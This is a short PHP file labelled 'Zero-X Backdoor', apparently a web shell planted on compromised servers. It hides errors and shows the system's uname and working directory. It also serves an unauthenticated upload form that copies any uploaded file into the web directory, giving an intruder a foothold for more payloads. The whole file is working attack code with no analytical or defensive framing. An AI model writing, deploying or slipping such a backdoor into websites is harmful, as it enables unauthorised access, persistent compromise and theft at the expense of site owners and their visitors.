<?php
error_reporting(0);
echo '<title>Zero-X Backdoor</title><style>
body{background-color:#000020;color:#e1e1e1;}</style>
<font style="Arial"><font color="red"><center><b><br><br>'.php_uname().'</b><br>
<font style="Arial"><font color="red"><center><b><br><br>Directory: '.getcwd().' <br></b><br>
<form action=""method="post" enctype="multipart/form-data" name="uploader" ></center><br>
<center><input type="file" name="file" size="50"><input name="_zx" type="submit"  value="Upload"/></form></center>';
$uploaddir = "./";
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
if($_POST['_zx'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $uploadfile)) {echo '<center><b><br>
<br><b>File Uploaded :<a href="'.$_FILES['file']['name'].'">'.$uploadfile.'</a></b><br><br></center>'; 
}else {echo '<b>'.$_FILES['file']['name'].' Not Uploaded.</b>';}}
?>
